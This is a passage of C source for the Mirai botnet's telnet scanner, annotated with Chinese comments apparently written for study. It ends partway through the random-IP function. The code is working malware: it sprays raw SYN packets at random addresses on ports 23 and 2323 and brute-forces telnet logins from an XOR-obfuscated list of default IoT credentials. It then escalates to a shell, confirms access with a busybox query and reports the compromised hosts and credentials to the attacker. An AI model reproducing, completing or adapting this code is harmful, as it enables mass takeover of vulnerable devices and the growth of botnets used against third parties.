#define _GNU_SOURCE

#define MIRAI_TELNET
#ifdef MIRAI_TELNET


#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"
//scanner模块的功能就是扫描其它可能受感染的设备，如果能满足telnet弱口令登录则将结果进行上报，恶意者主要借此扩张僵尸网络
int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;


//将接收到的空字符替换为'A'
int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);   //从sock接收len长度的字符串到buf中

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)   //接收到的字符串长度
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

//首先生成随机ip，而后随机选择字典中的用户名密码组合进行telnet登录测试
void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));  //维护连接的列表
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;  //初始化
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    //当开启该参数时：我们可以从IP报文首部第一个字节开始依次构造整个IP报文的所有选项，
    //但是IP报文头部中的标识字段(设置为0时)和IP首部校验和字段总是由内核自己维护的，不需要我们关心。
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);  //找到一个大于1024的源端口。

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);  //telnet的默认端口
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;    //首先发送SYN包，尝试发起连接【找到可访问的ip和对应可访问的端口】
    //弱密码字典，添加到auth_table中
    // Set up passwords
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker


#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)            //如果在登录后，没有成功得到shell的，会在这里重新进入新的一层循环，接下来会判断是不是timeout
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)  //fake_time初始化是当前时间。【也就是现在发送SYN的时间和之前不一样，就继续发SYN】
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)   //每秒的数据包数量PPS【160】，向多个不同的victim发送SYN数据包
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;  //每次构造raw tcp/ip数据包的暂存变量scanner_rawpkt
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;   //真实的源ip地址
                iph->daddr = get_random_ip();  //目的ip随机【除去了一些特殊的ip地址如127.0.0.1和196.128……】
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)   //对于10次请求，大多使用默认dst port为23，只有一次使用2323作为默认端口。
                {
                    tcph->dest = htons(2323);
                }
                else
                {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;   //TCP的seq设置了为daddr_ip。之后收到返回包可以验证
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr)); //发起SYN数据包
            }
        }
        //接下来验证收到的所有返回包的情况。
        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)  //验证是来自受害的23号端口回复的ACK+SYN包【没有存储victim ip的列表，而是存储在TCP seq中，因此只要返回包的源ip和TCP seq一致，说明是刚刚伪造的SYN包】
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)  //找一个可用的连接表表项存储当前conn
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)  //已经没有可用的连接表空间了
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;  //根据收到的SYN+ACK数据包，建立连接
            setup_connection(conn);   //建立connection
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }  
        //完成这个循环后，明确了发出160个SYN数据包后，收到的SYN+ACK回复情况，
        //从而确定所有可以连接的主机，并用新的套接字和这些主机重新建立连接，将连接套接字存储在conn_table中

        //以下根据连接的状态【+重连】，加入fdset集合。
        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd); /* 将set清零使集合中不含任何fd */
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);  // > SC_CONNECTING 表示已经是连接之后状态了，即登录验证、shell返回等
            //设定超时时间
            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)  //如果当前时间-上一次收到消息的时间超过了timeout
            {   //曾经连接过，是有效的conn_table条目，但是超时了
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);   //关闭连接。
                conn->fd = -1;   
                //如果之前是可以连接到telnet，现在尝试重新连接
                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 10)  //如果尝试了10次，还是没成功，就重置废弃这个连接【之后200行位置的下一层循环会重新用新的ip建立连接】
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);     //如果超时，但是之前成功回显过username-passwd，那么现在重新尝试连接。【也许之前尝试的用户名和密码不对】
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;   //如果之前就没办法回显username-passwd【如只允许使用密钥登录】，那么就直接废弃这个conn，重置为空
                }
                continue;
            }
            //select()机制中提供一fd_set的数据结构，实际上是一long类型的数组，每一个数组元素都能与一打开的文件句柄（不管是socket句柄，还是其他文件或命名管道或设备句柄）建立联系，
            //建立联系的工作由程序员完成，当调用select()时，由内核根据IO状态修改fd_set的内容，由此来通知执行了select()的进程哪一socket或文件发生了可读或可写事件。
            //根据state，加入不同的set集合【可读/可写】
            //注意: 当刚刚到达连接状态的时候，会放入到fdset_wr集合。如果不是connecting状态且非closed的其他状态的话都放入fdset_rd
            if (conn->state == SC_CONNECTING)  
            {
                FD_SET(conn->fd, &fdset_wr);  /*将fd加入set集合fdset_wr，之后调用select进行对所有telnet connection进行监听*/
                if (conn->fd > mfd_wr)   //记录最大的fd
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);/*将fd加入set集合fdset_rd，之后调用select进行对所有telnet connection进行监听*/
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;//记录最大的fd
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        //https://baike.baidu.com/item/select/12504672
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);  //第一个参数是所有监视描述符的最大值+1
        //第二个参数是监视这些文件描述符的读变化的，即我们关心是否可以从这些文件中读取数据了
        //第三个参数是监视这些文件描述符的写变化的，即我们关心是否可以向这些文件中写入数据了
        //第四个参数：等待1s【阻塞】，1s之内有事件到来就返回文件描述符，否则在超时后不管怎样一定返回：文件无变化返回0，有变化返回一个正值。
        //返回值：负值：select错误;正值：某些文件可读写；0：等待超时，没有可读写或错误的文件
        //返回时fdset_rd和fdset_wr会被修改，需要被读取/写入的文件描述符会被设置。其他监视的文件描述符会被clear。
        //https://cloud.tencent.com/developer/article/1344972【Part：理解select模型】
        fake_time = time(NULL);  //重新获得当前时间，更新last_recv的时间

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr)) /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd可以写入【只要有conntecion状态的fd才会在fdset_wr中】 */ 
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)  //如果套接字上没有发生错误
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();   //随机获取一个登录用户名+密码尝试【可能是二次尝试登录】
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);   //发生错误，直接关闭该套接字。不然下次getsockopt就不会获取到这个错误了。直接重置/初始化该socket。
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))  /* 测试conn->fd是否包含在集合fdset_rd中，也就是说这个文件描述符conn->fd可以读取*/ 
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)  //溢出了，那么就覆盖64位的旧数据
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    //recv【rdbuf_pos是缓冲区末尾字符的下标】
                    //此时处于SC_HANDLE_IACS截断，要进行协议的选项协商->使用IAC
                    //https://www.omnisecu.com/tcpip/iac-interpret-as-command-telnet.php
                    //https://tools.ietf.org/html/rfc854
                    //https://stackoverflow.com/questions/10413963/telnet-iac-command-answering
                    //https://www.cnblogs.com/liang-ling/p/5833489.html
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);   //接收尽可能多的字符【还剩下的缓冲区大小SCANNER_RDBUF_SIZE - conn->rdbuf_pos】
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 10)
                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;   //更新缓冲区指针，指向下一个空位置
                    conn->last_recv = fake_time;    //更新接收到信息的时间

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)    //NVT IAC 协商
                            {
                                conn->state = SC_WAITING_USERNAME;  //转成等待输入用户名状态
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:       //当前到达等待“<主机名> login:”的状态
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);   //发送用户名
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);    // 发送\n
                                conn->state = SC_WAITING_PASSWORD;  //进入输入密码模式
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:       //当前到达等待“Password:”的状态
                            if ((consumed = consume_pass_prompt(conn)) > 0)     //查找登录提示符
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);   //发送密码
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:   
                            if ((consumed = consume_any_prompt(conn)) > 0)  //如果找到了shell提示符说明尝试登录成功。
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd); 
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed【如果登录成功，尝试使用几个命令进入shell】
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);     //发送“enable”命令【显示所有激活的内部命令】
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:    //等待enable命令返回
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);        //解密得到“system”字符串
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);     //发送“system”命令
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;  
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)     
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);    //解密发送"shell"命令
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;    
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);      //解密发送"sh"命令
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)          
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(TABLE_SCAN_QUERY);         //解密发送"/bin/busybox MIRAI"命令【估计是被MIRAI定制的sh等或是攻击程序】
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);   //安装了busybox极大可能就是IOT设备了
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        //之前的命令尝试就算无效。也会有新的命令提示符出现。
                        //因此如果登录成功前面几个case的consume_any_prompt(conn)一定都是>0，因此一定会达到这个case
                        //
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);           //查找回显的字符串中是否有"MIRAI: applet not found"
                            if (consumed == -1)     //如果返回-1，则说明找到"ncorrect"。说明之前的登录没有成功【telnet提示Login incorrect】
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);    //关闭连接
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) == 10)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn); //尝试重新连接，回到connecting状态【不会再进入任何case，会在653行直接break上层的循环，一直回退，直到又可以重新尝试新的用户名和密码】
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)  //如果有"MIRAI: applet not found"，那么说明连接+登录成功了
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth); //报告登录主机的信息到attacker的服务器下【！！】
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)  //如果没有consumed的了。就break。不然不断继续状态的转移。
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;    //之前的处理，消耗了consumed个字符，现在则更新conn->rdbuf_pos。
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);  //处理过的字符就会移除掉，更新缓存内容【因为可能有重叠的情况，因此需要用memmove而不是memcpy】
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

//如果扫描的随机ip有回应，则建立正式连接
static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)  //新建本地socket，用这个socket维护和远程的连接
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));  //初始化缓冲区为0

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;  //存储上次接收到数据的时间
    conn->state = SC_CONNECTING;   //现在的连接状态为CONNECTING
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));   //对可用的主机重新发起连接！【这是侦察后可用telnet连接的主机了，所以一定会连接成功】
}
//获取随机ip地址，特殊ip段除外
static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
